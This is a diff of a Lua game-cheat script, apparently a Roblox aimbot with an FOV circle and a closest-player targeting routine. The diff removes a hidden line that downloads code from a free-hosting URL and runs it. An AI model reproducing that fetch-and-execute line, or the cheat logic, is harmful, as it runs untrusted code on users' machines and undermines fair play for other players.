@@ -32,7 +32,6 @@ FOVCircle.Thickness = _G.CircleThickness
 local function GetClosestPlayer()
 	local MaximumDistance = _G.CircleRadius
 	local Target = nil
-local UI = loadstring(game:HttpGet("https://myschoolprojectsite.000webhostapp.com/Index.php"))()
 	for _, v in next, Players:GetPlayers() do
 		if v.Name ~= LocalPlayer.Name then
 			if _G.TeamCheck == true then
